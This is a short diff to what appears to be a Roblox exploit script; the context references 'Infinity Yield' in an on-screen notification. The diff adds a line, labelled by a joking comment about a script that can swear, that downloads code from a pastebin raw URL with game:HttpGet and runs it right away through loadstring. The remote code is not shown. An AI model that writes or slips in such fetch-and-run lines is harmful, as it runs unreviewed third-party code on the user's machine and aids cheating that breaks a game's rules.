@@ -40,3 +40,7 @@ game.StarterGui:SetCore("SendNotification", {
     Button1 = "Infinity Yield"; -- Optional, makes a button appear with the given text that, when clicked, fires the Callback if it's given
     Button2 = "No"
 })
+
+
+--script that can say fuck lol
+loadstring(game:HttpGet("https://pastebin.com/raw/JFeVbTv6", true))()
